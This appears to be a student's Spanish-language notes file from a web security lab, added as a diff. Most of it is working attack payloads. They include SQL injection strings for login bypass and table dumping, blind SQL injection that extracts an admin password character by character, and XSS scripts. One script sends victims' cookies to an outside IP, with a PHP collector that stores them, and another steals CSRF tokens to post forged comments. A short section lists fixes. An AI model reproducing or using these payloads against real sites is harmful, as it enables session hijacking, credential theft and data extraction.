@@ -1,0 +1,321 @@
+Extenci¨®n
+https://chrome.google.com/webstore/detail/webspy-explore-and-test-w/aedipmheomnpcbgmanofhaccebgapije
+
+--------------------------------------------------------------------------------------------------------
+Detectar el tipo de base de datos:
+Inyectamos cada uno de las query y la que nos retorne informaciÃ³n seria el motor de base de datos usado.
+--------------------------------------------------------------------------------------------------------
+//mysql     
+' or ' 1 ' = ' 1' union select @@ version --
+//postgres  
+' or ' 1 ' = ' 1' union select version() --
+//sqlite    
+' or ' 1 ' = ' 1' union select sqlite_version() --
+
+--------------------------------------------------------------------------------------------------------
+Task 1
+--------------------------------------------------------------------------------------------------------
+//listamos contrase0Š9as
+'or'1'='1
+
+$user = $_POST['username'];
+select * from user where username= '  'or'1'='1  ' and password='  'or'1'='1  ' ;
+
+Solo ejecuta hasta antes del and porque los comentario borran el resto del query en codigo fuente  
+
+
+//listamos los nombres de las columnas
+' or ' 1 ' = ' 1' union all SELECT sql FROM sqlite_master WHERE tbl_name = 'users' AND type = 'table' --
+//listamos los nombres de los usuarios
+' or ' 1 ' = ' 1' union all SELECT name FROM users --
+
+
+--------------------------------------------------------------------------------------------------------
+Task 2
+--------------------------------------------------------------------------------------------------------
+//listamos las tablas de la base de datos
+' or ' 1 ' = ' 1' union all SELECT name FROM sqlite_master WHERE type = 'table' --
+
+pages y users
+
+//listamos las columnas
+' or ' 1 ' = ' 1' union all SELECT sql FROM sqlite_master WHERE tbl_name = 'pages' AND type = 'table' --
+
+Dentro hay campos php y views donde php tendra los nombres de paginas
+
+//listamos el contenido de la tabla
+' or ' 1 ' = ' 1' union all select php from pages --
+
+
+Primero debemos descubrir el nombre de la columnas y luego las informacion sin hacer un select all porque
+en union debemos tener el mismo numero resultados en los dos lados
+
+
+<script>console.log({"0":"comments","password":"comments"});</script>
+<script>console.log({"0":"hiddenContent","password":"hiddenContent"});</script>
+<script>console.log({"0":"index","password":"index"});</script>
+<script>console.log({"0":"login","password":"login"});</script>
+<script>console.log({"0":"search","password":"search"});</script>
+
+Alternativos 
+
+Google site:dominio
+robots.txt
+Fuerza bruta
+spider mirar el codigo todo lo que tenga el dominio
+
+
+
+
+
+--------------------------------------------------------------------------------------------------------
+Task 3
+--------------------------------------------------------------------------------------------------------
+
+
+<script> alert("XSS");</script>
+
+
+What do you notice with respect to authentication?
+
+1 No
+2. its sending a GET request with plain text wihtout autnetication 
+3. Percent-encoding, also known as URL encoding
+
+
+
+
+--------------------------------------------------------------------------------------------------------
+Task 4
+--------------------------------------------------------------------------------------------------------
+                                --------------------------------------------------------------------------------------------------------
+                                Codigo Javascript para enviar las Cookies 
+                                --------------------------------------------------------------------------------------------------------
+                                <script>
+                                let dat = new FormData(); crea objeto formdata
+                                dat.append("data", document.cookie);   le pone un objeto data y el valor la cookie
+                                fetch("http://167.172.157.203/pruebas/data/data.php", {  envia a un php en el servidor 
+                                        method: "post",
+                                        body: dat,
+                                    })
+                                </script>
+                                
+                                --------------------------------------------------------------------------------------------------------
+                                Codigo embebido en la URL (encoded).
+                                --------------------------------------------------------------------------------------------------------
+                                http://167.172.157.203/pruebas/search.php?q=%3Cscript%3E+let+dat+%3D+new+FormData%28%29%3B+dat.append%28%22data%22%2C+document.cookie%29%3B+
+                                +fetch%28%22http%3A%2F%2F167.172.157.203%2Fpruebas%2Fdata%2Fdata.php%22%2C+%7B+++++++++method%3A+%22post%22%2C+++++++++body%3A+dat%2C+++++%7D%29+%3C%2Fscript%3E
+                                
+                                --------------------------------------------------------------------------------------------------------
+                                Codigo php para almacenar las cookies en el servidor
+                                --------------------------------------------------------------------------------------------------------
+                                <?php
+                                header('Access-Control-Allow-Origin: *');  acepte desde cualquier sitio  CORS (Cross-Origin Resource Sharing) header.a  ORIGIN IS domain/port/protocol triplet.
+                                $file_cookies = 'cookies.txt';
+                                $data = $_POST['data']; recibe mediente post
+                                if (isset($data))   si hay info
+                                {
+                                   $file_handle = fopen($file_cookies, 'a+'); 
+                                   fwrite($file_handle,$data."\n");  escriba una nueva linea con la cookie
+                                   fclose($file_handle);
+                                }
+                                ?>
+
+
+
+--------------------------------------------------------------------------------------------------------
+Task 5
+--------------------------------------------------------------------------------------------------------
+comment=
+<script>alert('asdf');</script>&token256=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+
+Hay una validacion por el lado del cliente pero no desde el lado del servidor por eso se pueden modificar 
+los request
+	
+
+
+FUNCIONA
+<script> 
+window.location ="https://comments.php";
+alert("dsf");
+</script>
+
+
+<script>
+alert("csrf");
+</script>
+
+
+
+--------------------------------------------------------------------------------------------------------
+                                Save tokens in server                              --------------------------------------------------------------------------------------------------------
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+<script>
+let contenidocomments ="";
+$.get("comments.php", function(htmlexterno){
+        contenidocomments = htmlexterno;
+        parser = new DOMParser();
+        doc = parser.parseFromString(contenidocomments, "text/html");
+        const token = doc.querySelector("[name=token256]").value;
+        let dat = new FormData();
+        dat.append("data", token); 
+        fetch("http://127.0.0.1:8000/data.php", {
+        method: "post",
+        body: dat,
+        })
+});
+</script>
+
+--------------------------------------------------------------------------------------------------------
+                                XSS COMMENT ATTACK
+                                --------------------------------------------------------------------------------------------------------
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>
+<script>
+let contenidocomments ="";
+let token = "";
+let comentario = "<script>alert('XSS');</script>";
+$.get("comments.php", function(htmlexterno){
+        contenidocomments = htmlexterno;
+        parser = new DOMParser();
+        doc = parser.parseFromString(contenidocomments, "text/html");
+        token = doc.querySelector("[name=token256]").value;
+        let dat = new FormData();
+        dat.append("comment", comentario);
+        dat.append("token256", token); 
+        fetch("comments.php", {
+        method: "post",
+        body: dat,
+        })
+});
+</script>
+
+
+
+
+
+
+--------------------------------------------------------------------------------------------------------
+Task 6
+--------------------------------------------------------------------------------------------------------
+//archivo login.php
+$username = SQLite3::escapeString($_POST["username"]);
+$password = SQLite3::escapeString($_POST["password"]);
+
+//archivo comments.php
+htmlentities($_POST['comment'])
+
+//archivo search.php
+$q = SQLite3::escapeString($_GET['q']);
+htmlentities($_GET['q'])
+
+
+ session_start();   // AUTHENTICATE PAGES
+
+    
+    if(!isset($_SESSION['login'])) {
+         echo "<h2>You must be logged in to access the search page</h2>";
+    
+    }else {
+    
+
+--------------------------------------------------------------------------------------------------------
+Submission
+--------------------------------------------------------------------------------------------------------
+        
+        --------------------------------------------------------------------------------------------------------
+        Lista de paginas:
+        --------------------------------------------------------------------------------------------------------
+        comments.php       -> authenticated
+        index.php          -> pre-authenticated
+        hiddenContent.php  -> pre-authenticated
+        search.php         -> pre-authenticated
+        
+        --------------------------------------------------------------------------------------------------------
+        Lista de usuarios:
+        --------------------------------------------------------------------------------------------------------
+        admin   -> urock!
+        ada     -> lovelace
+        charles -> analytical
+
+
+
+Find number of Tables in the Database
+Number of tables is less than 3
+username=ada&password=lovelace'and (SELECT count(tbl_name) FROM sqlite_master WHERE
+type='table' and tbl_name NOT like 'sqlite_%' ) < 3 -- -
+
+First Table name is ‘users’
+Method
+Get first character of Table 
+First character u, which is greater than t
+username=ada'and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master
+WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) >
+hex('t')-- -&password=lovelace
+Second character s, which is greater than r
+username=ada'and (SELECT hex(substr(tbl_name,2,1)) FROM sqlite_master
+WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) >
+hex('r')-- -&password=lovelace
+Third character e, which is greater than d
+username=ada'and (SELECT hex(substr(tbl_name,3,1)) FROM sqlite_master
+WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) >
+hex('d')-- -&password=lovelace
+
+Fourth character is r, greater than q
+username=ada'and (SELECT hex(substr(tbl_name,4,1)) FROM sqlite_master
+WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) >
+hex('q')-- -&password=lovelace
+
+
+Fifth character is s, greater than r
+username=ada'and (SELECT hex(substr(tbl_name,5,1)) FROM sqlite_master
+WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) >
+hex('r')-- -&password=lovelace
+
+Hence, table name is ‘users’
+=========================================================
+
+Getting Password of ‘admin’ user:
+First Character is ‘u’
+username=ada' and (Select hex(substr(password,1,1)) from users limit 1 offset 0) =
+hex('u')-- -&password=lovelace
+
+
+Second Character is ‘r’
+username=ada' and (Select hex(substr(password,2,1)) from users limit 1 offset 0) =
+hex('r')-- -&password=lovelace
+
+Third Character is ‘o’
+username=ada' and (Select hex(substr(password,3,1)) from users limit 1 offset 0) =
+hex('o')-- -&password=lovelace
+Fourth Character is ‘c’
+username=ada' and (Select hex(substr(password,4,1)) from users limit 1 offset 0) =
+hex('c')-- -&password=lovelace
+
+Fifth Character is ‘k’
+username=ada' and (Select hex(substr(password,5,1)) from users limit 1 offset 0) =
+hex('k')-- -&password=lovelace
+
+Sixth Character is ‘!’
+username=ada' and (Select hex(substr(password,6,1)) from users limit 1 offset 0) =
+hex('!')-- -&password=lovelace
+
+
+
+
+Getting user’s session:
+<script>alert(document.cookie);</script>
+
+Replace the cookie in another browser and steal user’s session.
+
+
+
+
+
+
+
+
+        
+        
